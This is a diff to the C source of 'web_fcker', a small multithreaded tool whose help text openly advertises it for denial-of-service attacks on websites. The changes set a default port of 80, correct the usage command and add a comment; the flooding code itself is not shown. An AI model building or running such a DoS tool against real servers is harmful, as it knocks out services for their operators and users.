@@ -27,8 +27,8 @@ gcc web_fcker.c -o web_fcker -lpthread
 #define THREAD_COUNT 5
 
 
-char web_address[32] = "";
-int web_port = 0;
+char web_address[32];
+int web_port = 80;
 
 void welcome(void){
 
@@ -46,7 +46,7 @@ void welcome(void){
 }
 
 void help(void){
-    printf("Maybe you can need some help about using it?\nThere is the flags and meanings:\n-t : define web server\n-p : define servers port\nYou can attack DoS(Denial-of-Service) type to websites with that tool.\nHow to run:\nexec web_fcker.c -t <server_ip> -p <server_port>"); 
+    printf("Maybe you can need some help about using it?\nThere is the flags and meanings:\n-t : define web server\n-p : define servers port\nYou can attack DoS(Denial-of-Service) type to websites with that tool.\nHow to run:\./web_fcker -t <server_ip> -p <server_port>"); 
 
     exit(1);
 }
@@ -115,7 +115,7 @@ int main(int argc, char *argv[]){
 
     }
 
-    if(strlen(web_address) > 0 && web_port != 0){
+    if(strlen(web_address) > 0 && /*80 default for port*/web_port != 0){
         
 
         pthread_t tid[THREAD_COUNT];
